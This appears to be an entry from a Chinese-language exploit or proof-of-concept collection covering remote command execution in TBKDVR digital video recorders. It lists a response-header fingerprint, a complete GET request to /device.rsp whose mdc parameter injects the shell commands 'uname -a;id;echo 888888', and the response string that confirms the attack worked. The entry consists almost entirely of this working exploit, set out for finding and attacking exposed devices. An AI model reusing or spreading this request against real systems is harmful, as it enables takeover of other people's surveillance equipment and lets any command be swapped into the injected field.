# TBKDVR硬盘录像机-RCE-device

TBKDVR ｜ 命令执行 ｜ —
- **指纹**：`"Location: /login.rsp"`
- **请求**：`GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;id;echo%20888888 HTTP/1.1`
- **响应特征**：200 888888